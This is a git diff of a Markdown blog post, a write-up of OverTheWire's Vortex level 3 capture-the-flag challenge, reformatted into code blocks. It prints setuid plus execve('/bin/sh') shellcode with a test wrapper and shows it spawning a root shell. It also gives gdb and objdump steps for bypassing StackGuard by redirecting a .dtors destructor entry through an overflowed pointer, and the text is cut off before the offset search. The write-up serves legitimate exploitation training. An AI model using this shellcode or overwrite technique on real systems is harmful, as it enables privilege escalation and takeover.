@@ -9,7 +9,9 @@ title:  "[CTF] OverTheWire Vortex Level 3"
 As mentioned in the description, [level 3](http://overthewire.org/wargames/vortex/vortex3.html) is a little bit tricky. We see that we'll have to place the shellcode in the _`buf`_ variable using _`strcpy`_ and the shellcode will require a setuid (LEVEL4_UID), since bash drops effective privileges.
 
 ## Test a setuid + execve shellcode
-I've taken a shellcode that does this from here, and test it from a wrapper function:
+
+I've taken a shellcode that does exactly this from [here](https://pastebin.com/r5gGpSan), and test it from a wrapper C function:
+```c
 /* 32 bytes setuid(0) + execve("/bin/sh",["/bin/sh",NULL]); */
 char shellcode[] =
   "\x6a\x17"              // push $0x17
@@ -36,60 +38,57 @@ int main() {
  
  return 0;
 }
-And to compile and test: 
-?
-1
-2
-3
+```
+
+Let's compile and test: 
+```bash
 # gcc test_shell3.c -o test_shell
 # ./test_shell 
 sh-4.1# 
+```
 
-Bypass StackGuard
-The article from [2] describes a bypass method for a situation similar with our code. The idea is that by overflowing buf, we can modify lpp, and with this code ( **lpp = (unsigned long) &buf;) we can place the beginning of the buffer in an address referred to by an address we can control - there's a double indirection.
-Let's try to modify the flow with this method, by changing the destructor function, called in the last line of code (exit(0);). To find the address of the destructors:
-?
-1
-2
-3
-4
-5
-6
+## Bypass StackGuard
+[This article](http://phrack.org/issues/56/5.html#article) from PHRACK magazine describes a bypass method for a situation similar with ours. The idea is that by overflowing _`buf`-, we can modify _`lpp`_, and with this code
+```c
+**lpp = (unsigned long) &buf;
+```
+we can place the beginning of the buffer in an address referred to by an address we can control - there's a double indirection. Let's try to modify the flow with this method, by changing the destructor function, called in the last line of code (_`exit(0);`_). To find the address of the destructors:
+
+```bash
 vortex3@melissa:/vortex$ objdump -s -j .dtors vortex3
  
 vortex3:     file format elf32-i386
  
 Contents of section .dtors:
  804953c ffffffff 00000000                    ........      
-As described in [1], the layout of the destructors section is as follows:
+```
+
+As described [here](http://www.overthewire.org/wargames/vortex/readingmaterial/dtors.txt), the layout of the destructors section is as follows:
+```
 0xffffffff <function address> <another function address> ... 0x00000000 
-So we will change the address of the first function to be called (0x08049540). We need an address to put in the lpp pointer, and that address to point to 0x08049540:
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
+```
+
+So we will change the address of the first function to be called (_`0x08049540`_). We need an address to put in the _`lpp`_ pointer, and that address to point to 0x08049540:
+```bash
 $ gdb vortex3
 (gdb) set disassembly-flavor intel
 (gdb) disassemble __do_global_dtors_aux 
 Dump of assembler code for function __do_global_dtors_aux:
-...
+[..]
    0x08048360 <+16>: mov    eax,ds:0x8049644
    0x08048365 <+21>: mov    ebx,0x8049540
    0x0804836a <+26>: sub    ebx,0x804953c
-...
+[..]
 (gdb) x/x 0x08048366
 0x8048366 <__do_global_dtors_aux>: 0x08049540
-We find 0x08048366, that points to 08049540 (first destructor function). If we manage to place 0x08048366 in the lpp pointer (by overflowing buf), the double indirection in  **lpp = (unsigned long) &buf; line will add the code in buf variable to be executed as a destructor.
+```
 
-Find lpp offset
+We find 0x08048366, that points to _`08049540`_ (first destructor function). If we manage to place _`0x08048366`_ in the _`lpp`_ pointer (by overflowing buf), the double indirection will add the code in buf variable to be executed as a destructor:
+```
+**lpp = (unsigned long) &buf
+```
+
+## Find lpp offset
 We'll build the vortex3 source code locally, with added prints to track lpp value after overflowing buf. To reproduce the environment in the vortex labs, we need to disable ASLR (Address Space Layout Randomization) and compile without stack protector:
 ?
 1
